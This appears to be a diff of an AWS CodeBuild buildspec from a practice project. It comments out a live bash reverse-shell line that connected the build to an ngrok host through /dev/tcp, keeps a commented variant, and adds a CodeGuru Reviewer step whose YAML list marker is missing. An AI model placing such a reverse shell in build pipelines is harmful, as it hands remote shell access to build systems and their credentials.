@@ -11,12 +11,15 @@ phases:
       - echo "we are in the pre build phase"
   build:
     commands:
-      - echo "we are in the build block"
+      #- echo "we are in the build block"
       #- bash -c 'bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/xxxxx0>&1'
-      - bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/12717 0>&1'
-      - echo "we will run some tests"
-      - ls
-      - grep -Fq "Cross-Site Scripting (XSS)" index.html
+      #- bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/12717 0>&1'
+      #- echo "we will run some tests"
+      #- ls
+      #- grep -Fq "Cross-Site Scripting (XSS)" index.html
+      # Analizar el código con CodeGuru Reviewer
+      - echo Running CodeGuru Reviewer...
+      aws codeguru-reviewer create-code-review --repository-association-arn arn:aws:codeguru-reviewer:us-east-2:941377112071:association:77be1123-3b4d-4161-9e89-983e05fdd06b:code-review:RepositoryAnalysis-balonsomiguel_awsEjemplo1-master-66f49c6e-3f3b-4174-a445-c89397e62007 --type PullRequest --target-repository-name awsEjemplo1
   post_build:
     commands:
       - echo "we are in the post build phase"
